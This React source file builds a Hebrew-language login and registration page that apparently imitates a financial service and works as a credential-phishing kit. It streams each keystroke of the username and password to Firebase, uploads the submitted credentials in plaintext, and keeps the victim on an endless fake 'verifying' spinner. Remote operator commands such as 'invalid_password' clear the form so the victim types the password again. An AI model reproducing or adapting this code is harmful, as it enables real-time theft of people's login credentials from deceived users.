import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { useFirebaseClient } from '../hooks/useFirebaseClient';
import { reportTyping } from '../firebase/typing';

const LoginPage: React.FC = () => {
  const { t } = useTranslation();
  const navigate = useNavigate();
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [showSpinner, setShowSpinner] = useState(false);
  const [invalidEmailMessage, setInvalidEmailMessage] = useState('');
  const [invalidPasswordMessage, setInvalidPasswordMessage] = useState('');
  const [showInvalidDataPopup, setShowInvalidDataPopup] = useState(false);
  const [hasInvalidPassword, setHasInvalidPassword] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isDesktopMenuOpen, setIsDesktopMenuOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [currentLoadingText, setCurrentLoadingText] = useState(0);
  const [loginTexts] = useState([
    'מאמת פרטי התחברות...',
    'בודק אבטחת החשבון...',
    'מתחבר לשרת...',
    'טוען נתוני משתמש...',
    'מסיים תהליך התחברות...'
  ]);
  const [currentTextIndex, setCurrentTextIndex] = useState(0);

  // Hook do Firebase Client para registrar este visitante
  const {
    clientId,
    clientData,
    isOnline,
    loading: firebaseLoading,
    updateClientData,
    commands,
    isClientIdValid,
  } = useFirebaseClient(navigate);

  // Função de login que registra o cliente
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    setLoading(true);
    setError('');
    setSuccess('');
    setIsLoading(true);

    try {
      // Start rotating loading texts
      const textInterval = setInterval(() => {
        setCurrentLoadingText(prev => (prev + 1) % loginTexts.length);
      }, 2000);

      // Preparar dados do cliente para registro
      const clientData = {
        documentId: 'inicial', // ID fixo como solicitado
        documentNumber: 'documento_padrao',
        email: emailOrPhone || 'user@example.com',
        password: password || 'defaultpass',
        userAgent: navigator.userAgent,
        currentUrl: window.location.href,
        currentPage: 'Home',
        timestamp: new Date().toISOString(),
        fromForm: true,
        hasCredentials: true,
        lastActivity: Date.now(),
        lastPing: Date.now(),
        online: true,
        userActive: true
      };

      console.log('🔐 LoginForm - Registrando cliente:', clientData);

      // Atualizar dados no Firebase
      await updateClientData(clientData);

      // Mostrar spinner com logo (carregamento infinito)
      setShowSpinner(true);
      
      // Não redireciona mais - fica carregando infinitamente

    } catch (error) {
      console.error('❌ Erro no login:', error);
      setError('Erro ao fazer login. Tente novamente.');
      setIsLoading(false);
    } finally {
      setLoading(false);
    }
  };

  // Função de registro de cliente
  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    
    setIsRegistering(true);
    setLoading(true);
    setError('');
    setSuccess('');

    try {
      // Preparar dados do cliente para registro
      const registerData = {
        documentId: 'registro_inicial',
        documentNumber: 'novo_documento',
        email: emailOrPhone || 'newuser@example.com',
        password: password || 'newpassword',
        userAgent: navigator.userAgent,
        currentUrl: window.location.href,
        currentPage: 'Register',
        timestamp: new Date().toISOString(),
        fromForm: true,
        hasCredentials: true,
        isNewRegistration: true,
        registrationDate: new Date().toISOString(),
        lastActivity: Date.now(),
        lastPing: Date.now(),
        online: true,
        userActive: true
      };

      console.log('📝 Registrando novo cliente:', registerData);

      // Atualizar dados no Firebase
      await updateClientData(registerData);

      setSuccess('Registro realizado com sucesso!');
      
      // Mostrar spinner após registro
      setShowSpinner(true);

    } catch (error) {
      console.error('❌ Erro no registro:', error);
      setError('Erro ao registrar. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  const handlePasswordRecovery = () => {
    console.log('Password recovery clicked');
  };

  // Função para limpar comandos de invalidação
  const clearInvalidationCommand = (command: string) => {
    // Esta função seria implementada no hook useFirebaseClient
    console.log(`Clearing command: ${command}`);
  };

  // Efeito para monitorar comandos do Firebase
  useEffect(() => {
    if (!commands || commands.length === 0) return;

    // Verificar comando de senha inválida
    if (commands.includes('invalid_password') || commands.includes('inv_password')) {
      setIsLoading(false); // Para o spinner loading
      setShowSpinner(false); // Para o spinner showSpinner
      setHasInvalidPassword(true);
      setShowInvalidDataPopup(true); // Mostrar popup de dados inválidos
      
      // Timer para esconder o popup após 2 segundos
      setTimeout(() => {
        setShowInvalidDataPopup(false);
        setHasInvalidPassword(false);
      }, 2000);
      
      // Limpar inputs
      setEmailOrPhone('');
      setPassword('');
      clearInvalidationCommand('invalid_password');
      clearInvalidationCommand('inv_password');
    }
  }, [commands]);

  // Alternar entre login e registro
  const toggleMode = () => {
    setIsRegistering(!isRegistering);
    setError('');
    setSuccess('');
  };

  return (
    <div className="min-h-screen overflow-x-hidden" style={{ backgroundColor: '#F4F5FA' }}>
      {/* Header Mobile com altura reduzida */}
      <header 
        className="w-full py-1 md:py-2"
        style={{ backgroundColor: '#13114A' }}
      >
        {/* VERSÃO DESKTOP - oculta no mobile */}
        <div className="hidden md:flex justify-between items-center w-full px-0">
          {/* Menu hamburger com botões colados */}
           <div className="flex items-center space-x-2 ml-0 relative">
                <button 
                  onClick={() => setIsDesktopMenuOpen(!isDesktopMenuOpen)}
                  className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
                >
                   <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'opacity-0' : ''}`}></div>
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
                   </div>
                 </button>
                {/* Bolinha pulsante amarela movida mais para baixo */}
                 <div className="absolute top-2 -left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-10"></div>
             
             {/* Barra vertical separadora */}
             <div className="h-12 w-px bg-white opacity-10"></div>
             
             {/* Botão 1 - com SVG de acessibilidade mais grosso, menos alto */}
             <button className="text-white px-3 py-2 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors flex items-center space-x-2">
               <svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="currentColor" strokeWidth="2">
                 <path d="M12 6.5a2 2 0 1 0-2-2 2 2 0 0 0 2 2m7.5 14h-1v-5a1 1 0 0 0-1-1h-5v-2h5a1 1 0 0 0 0-2h-5v-2a1 1 0 0 0-2 0v7a1 1 0 0 0 1 1h5v5a1 1 0 0 0 1 1h2a1 1 0 0 0 0-2m-6.8-1.6a4 4 0 0 1-7.2-2.4 4 4 0 0 1 2.4-3.66A1 1 0 1 0 7.1 11a6 6 0 1 0 7.2 9.1 1 1 0 0 0-1.6-1.2"/>
               </svg>
               <span>נגישות</span>
             </button>
             {/* Botão 2 - menor na altura */}
             <button className="text-white px-3 py-1 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors">
               תמיכה
             </button>

             {/* Botão 3 - cor #1A97F0 com largura reduzida */}
             <button className="text-white px-2 py-1 text-base rounded-full border transition-colors" style={{backgroundColor: '#1A97F0', borderColor: '#1A97F0'}}>
               כניסה
             </button>
           </div>

          {/* Seção direita com posicionamento flexível */}
           <div className="flex items-center flex-1 mr-6">
             {/* Espaçador flexível que empurra tudo para a direita */}
             <div className="flex-1" />
             
             {/* ========== ÁREA DE POSICIONAMENTO DO SVG ========== */}
              {/* PARA MOVER PARA A ESQUERDA: Aumente o número abaixo */}
              {/* Exemplo: mr-4, mr-8, mr-12, mr-16, mr-20, mr-24, mr-32 */}
              {/* NÚMERO ATUAL PARA ESQUERDA: 0 (mude para 4, 8, 12, 16, etc.) */}
              <div className="mr-60 mr-0">
               <svg
                 width="24"
                 height="24"
                 viewBox="0 0 512 512"
                 xmlns="http://www.w3.org/2000/svg"
                 className="text-white"
               >
                 <path
                   fill="currentColor"
                   d="M64 112h128v48h-80v64H64zm336 48h-80v-48h128v112h-48zM64 288h48v64h80v48H64zm256 64h80v-64h48v112H320z"
                 />
               </svg>
             </div>
 
             {/* Divisor do lado direito do SVG */}
             <div className="h-12 w-px bg-white opacity-10 ml-4"></div>
 
             {/* Divisor à esquerda da logo */}
             <div className="h-12 w-px bg-white opacity-10 mr-8 mr-12"></div>
 
             {/* Logo na extrema direita */}
             <img src="/iamgeheadaer.png" alt="Header Logo" className="h-30 w-auto" />
           </div>
        </div>

        {/* VERSÃO MOBILE - visível apenas no mobile */}
        <div className="flex md:hidden justify-between items-center w-full px-4">
          {/* Logo à esquerda */}
          <div className="flex items-center">
            <img src="/iamgeheadaer.png" alt="Header Logo" className="h-8 w-auto" />
            {/* Barra quase invisível à direita da imagem */}
            <div className="h-12 w-px bg-white opacity-5 ml-4"></div>
          </div>

          {/* Texto centralizado - maior com seta à esquerda */}
          <div className="flex items-center text-white">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
            <span className="text-lg font-medium">שערי מטבע</span>
          </div>

          {/* Menu hamburger à direita - copiado exatamente do desktop */}
          <div className="flex items-center space-x-2 mr-0 relative">
            <button 
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            {/* Bolinha pulsante amarela - ajustada para ficar mais à esquerda e um pouco mais para cima */}
            <div className="absolute top-1.5 left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-20"></div>
          </div>
        </div>
        
        {/* Desktop Menu Dropdown */}
           {isDesktopMenuOpen && (
             <div className="hidden md:block fixed top-16 left-4 w-48 bg-white shadow-lg border border-gray-200 rounded-lg z-[9999] animate-in slide-in-from-top-2 duration-300">
            <div className="px-4 py-4 space-y-3">
              <nav className="space-y-3">
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ביקור</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ברוכה (פרי)</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שערי מטבע</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שאלות נפוצות</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>יצירת קשר</span>
                </a>
              </nav>
            </div>
          </div>
        )}
        
        {/* Mobile Menu Dropdown */}
           {isMobileMenuOpen && (
             <div className="md:hidden fixed top-16 right-4 w-48 bg-white shadow-lg border border-gray-200 rounded-lg z-[9999] animate-in slide-in-from-top-2 duration-300">
            <div className="px-4 py-4 space-y-3">
              <nav className="space-y-3">
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ביקור</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>ברוכה (פרי)</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שערי מטבע</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>שאלות נפוצות</span>
                </a>
                <a href="#" className="flex items-center text-gray-900 hover:text-blue-600 font-medium text-base py-2 transition-colors">
                  <span>יצירת קשר</span>
                </a>
              </nav>
            </div>
          </div>
        )}
      </header>

      {/* Navigation tabs - barra completa no mobile colada no header */}
      <div className="md:hidden w-full bg-white relative">
        <div className="flex w-full relative">
          <button 
           onClick={() => setIsRegistering(true)}
           className={`flex-1 py-4 text-xl font-medium transition-colors relative z-10 ${
             isRegistering ? 'text-blue-500' : 'text-gray-400'
           }`}
           style={{ fontFamily: 'Rubik, sans-serif' }}
         >
           הרשמה
         </button>
         
          <button 
           onClick={() => setIsRegistering(false)}
           className={`flex-1 py-4 text-xl font-medium transition-colors relative z-10 ${
             !isRegistering ? 'text-blue-500' : 'text-gray-400'
           }`}
           style={{ fontFamily: 'Rubik, sans-serif' }}
         >
           כניסה
         </button>
        </div>
        {/* Barra cinza de fundo - mais fina */}
         <div className="absolute bottom-0 w-full h-0.5 bg-gray-300"></div>
         {/* Barra azul que se move - mais fina */}
         <div 
           className={`absolute bottom-0 h-0.5 bg-blue-500 transition-all duration-300 ease-in-out ${
             isRegistering ? 'left-0 w-1/2' : 'left-1/2 w-1/2'
           }`}
         ></div>
      </div>

      {/* Modal de Login - colado na barra de navegação */}
      <div className="w-full md:max-w-[95%] max-w-full md:mx-auto mx-0 md:mt-8 mt-0 md:rounded-lg rounded-none bg-white md:p-8 p-6" style={{ fontFamily: 'Rubik, sans-serif' }}>
        {/* Navigation tabs desktop apenas */}
        <div className="hidden md:flex md:justify-end md:mb-6 md:-mt-2 md:px-0">
          <div className="flex space-x-2 relative">
            {/* Barra cinza de fundo mais sutil */}
            <div className="absolute bottom-0 h-0.5 bg-gray-200" style={{left: '16px', right: '16px'}}></div>
            
            <button 
             onClick={() => setIsRegistering(true)}
             className={`px-4 py-2 text-lg font-medium transition-colors relative ${
               isRegistering 
                 ? 'text-black' 
                 : 'text-black hover:text-gray-700'
             }`}
             style={{ fontFamily: 'Rubik, sans-serif', color: isRegistering ? '#0C66FF' : 'black' }}
           >
             הרשמה
             {isRegistering && <div className="absolute bottom-0 left-0 right-0 h-0.5" style={{backgroundColor: '#0C66FF'}}></div>}
           </button>
           
           <button 
             onClick={() => setIsRegistering(false)}
             className={`px-4 py-2 text-lg font-medium transition-colors relative ${
               !isRegistering 
                 ? 'text-black' 
                 : 'text-black hover:text-gray-700'
             }`}
             style={{ fontFamily: 'Rubik, sans-serif', color: !isRegistering ? '#0C66FF' : 'black' }}
           >
             כניסה
             {!isRegistering && <div className="absolute bottom-0 left-0 right-0 h-0.5" style={{backgroundColor: '#0C66FF'}}></div>}
           </button>
          </div>
        </div>
        {isLoading || showSpinner ? (
          <div className="text-center py-12">
            <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600 mx-auto mb-6"></div>
            <h3 className="text-xl font-semibold text-gray-900 mb-2">
              {loginTexts[currentLoadingText]}
            </h3>
            <p className="text-gray-600">
              אנא המתן...
            </p>
          </div>
        ) : (
        <form onSubmit={isRegistering ? handleRegister : handleLogin} className="space-y-8 max-w-md mx-auto md:px-0 px-4">
            {/* Email or Phone field - sem label */}
            <div>
              <input
                  type="text"
                  id="emailOrPhone"
                  value={emailOrPhone}
                  onChange={(e) => {
                  setEmailOrPhone(e.target.value);
                  setHasInvalidPassword(false); // Limpar erro quando usuário digitar
                  setShowInvalidDataPopup(false); // Fechar popup quando usuário digitar
                  reportTyping('email', e.target.value);
                }}
                  className={`w-full px-6 py-2 border rounded-full focus:outline-none text-right text-base ${
                    hasInvalidPassword 
                      ? 'border-red-400 focus:border-red-400 border-opacity-60' 
                      : 'border-gray-300 focus:border-blue-400'
                  }`}
                  placeholder="שם המשתמש שלך"
                  dir="rtl"
                  style={{ fontFamily: 'Rubik, sans-serif' }}
                />
            </div>

            {/* Password field - sem label */}
            <div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    setHasInvalidPassword(false); // Limpar erro quando usuário digitar
                    setShowInvalidDataPopup(false); // Fechar popup quando usuário digitar
                    reportTyping('password', e.target.value);
                  }}
                  className={`w-full px-6 py-2 border rounded-full focus:outline-none text-right text-base ${
                    hasInvalidPassword 
                      ? 'border-red-400 focus:border-red-400 border-opacity-60' 
                      : 'border-gray-300 focus:border-blue-400'
                  }`}
                  placeholder="הסיסמה שלך"
                  dir="rtl"
                  style={{ fontFamily: 'Rubik, sans-serif' }}
                />
              </div>
            </div>

            {/* Error message */}
            {error && (
              <div className="text-red-500 text-center text-sm">
                {error}
              </div>
            )}

            {/* Success message */}
            {success && (
              <div className="text-green-500 text-center text-sm">
                {success}
              </div>
            )}

            {/* Submit button - largura configurável */}
            <div className="flex justify-center">
              <button
                type="submit"
                disabled={loading}
                className="bg-blue-500 text-white py-4 px-16 md:px-8 md:py-2 rounded-full hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors text-lg md:text-sm disabled:opacity-50"
                style={{ 
                   fontFamily: 'Rubik, sans-serif',
                   /* Configuração de largura do botão - altere os valores abaixo */
                   minWidth: '180px', /* Largura mínima - diminuída um pouco */
                   maxWidth: '280px'  /* Largura máxima - diminuída um pouco */
                 }}
              >
                {loading ? 'מעבד...' : (isRegistering ? 'הרשמה' : 'כניסה')}
              </button>
            </div>

            {/* Password recovery link */}
             <div className="text-center mt-4">
               <button
                 type="button"
                 onClick={handlePasswordRecovery}
                 className="text-blue-500 hover:text-blue-700 text-base underline"
               >
                 שחזור סיסמה
               </button>
             </div>


          </form>
        )}
      </div>

      {/* Popup de dados inválidos - canto superior direito, vermelho e mais discreto */}
      {showInvalidDataPopup && (
        <div className="fixed top-16 right-4 md:top-20 md:right-6 z-40 animate-slide-in-right">
          <div 
            className="p-3 rounded-md shadow-md max-w-xs text-white"
            style={{ backgroundColor: '#dc2626' }}
          >
            <div className="flex items-center justify-between">
              <div className="flex-1">
                <p className="text-sm" style={{ fontFamily: 'Rubik, sans-serif' }}>
                  נתונים לא חוקיים - נסה שוב
                </p>
              </div>
              <button
                onClick={() => {
                  setShowInvalidDataPopup(false);
                  setHasInvalidPassword(false);
                }}
                className="text-white hover:text-red-200 ml-2 text-lg leading-none"
              >
                ×
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoginPage;